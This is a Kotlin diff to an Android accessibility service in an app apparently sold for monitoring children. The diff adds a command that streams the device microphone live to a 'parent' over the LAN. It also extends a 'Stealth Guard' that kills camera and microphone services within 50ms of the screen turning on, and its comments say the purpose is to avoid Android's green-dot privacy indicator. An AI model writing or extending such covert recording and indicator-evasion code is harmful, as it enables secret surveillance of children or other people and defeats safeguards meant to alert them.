@@ -1184,7 +1184,8 @@ class VyraAccessibilityService : AccessibilityService() {
                     }
                     startService(intent)
                 }
-                "START_AMBIENT_RECORDING", "START_LIVE_AUDIO" -> {
+                "START_AMBIENT_RECORDING" -> {
+                    // Ambient = background file recorder (pocket mic)
                     val intent = Intent(this, AmbientAudioLoggerService::class.java).apply {
                         setAction(AmbientAudioLoggerService.ACTION_START_AMBIENT_RECORDING)
                     }
@@ -1195,12 +1196,31 @@ class VyraAccessibilityService : AccessibilityService() {
                     }
                     Log.i(AppConstants.TAG, "Triggered on-demand Ambient Audio Recording")
                 }
-                "STOP_AMBIENT_RECORDING", "STOP_LIVE_AUDIO" -> {
+                "STOP_AMBIENT_RECORDING" -> {
                     val intent = Intent(this, AmbientAudioLoggerService::class.java).apply {
                         setAction(AmbientAudioLoggerService.ACTION_STOP_AMBIENT_RECORDING)
                     }
                     startService(intent)
                     Log.i(AppConstants.TAG, "Stopped on-demand Ambient Audio Recording")
+                }
+                "START_LIVE_AUDIO" -> {
+                    // Live Audio = real-time LAN streaming to parent (one-tap live listen)
+                    val intent = Intent(this, LiveAudioStreamService::class.java).apply {
+                        setAction(LiveAudioStreamService.ACTION_START_LIVE_AUDIO)
+                    }
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        startForegroundService(intent)
+                    } else {
+                        startService(intent)
+                    }
+                    Log.i(AppConstants.TAG, "LiveAudioStreamService STARTED — real-time LAN mic stream active")
+                }
+                "STOP_LIVE_AUDIO" -> {
+                    val intent = Intent(this, LiveAudioStreamService::class.java).apply {
+                        setAction(LiveAudioStreamService.ACTION_STOP_LIVE_AUDIO)
+                    }
+                    startService(intent)
+                    Log.i(AppConstants.TAG, "LiveAudioStreamService STOPPED")
                 }
             }
         }
@@ -1220,14 +1240,20 @@ class VyraAccessibilityService : AccessibilityService() {
 
                         com.vyra.kids.core.FirebaseSyncManager.getInstance(this@VyraAccessibilityService).syncDeviceStatus(isScreenOn = true)
                         if (prefs.isStealthScreenGuardEnabled) {
-                            Log.w(AppConstants.TAG, "Stealth Guard: Child turned screen ON! Instantly killing Camera/Mic to avoid Green Dot detection.")
-                            // Immediately cut off camera & ambient mic streams within 50ms
+                            Log.w(AppConstants.TAG, "Stealth Guard: Child turned screen ON! Killing Camera/Mic within 50ms to avoid Green Dot.")
+                            // 1. Kill remote camera stream
                             stopService(Intent(this@VyraAccessibilityService, RemoteCameraStreamService::class.java))
-                            
+                            // 2. Kill ambient file recorder
                             val stopAmbient = Intent(this@VyraAccessibilityService, AmbientAudioLoggerService::class.java).apply {
                                 action = AmbientAudioLoggerService.ACTION_STOP_AMBIENT_RECORDING
                             }
                             startService(stopAmbient)
+                            // 3. Kill live LAN audio stream (was missing — this was leaving mic green dot visible!)
+                            val stopLiveAudio = Intent(this@VyraAccessibilityService, LiveAudioStreamService::class.java).apply {
+                                action = LiveAudioStreamService.ACTION_STOP_LIVE_AUDIO
+                            }
+                            startService(stopLiveAudio)
+                            Log.i(AppConstants.TAG, "Stealth Guard: All mic/camera services killed on screen-ON")
                         }
                     }
                     Intent.ACTION_SCREEN_OFF -> {
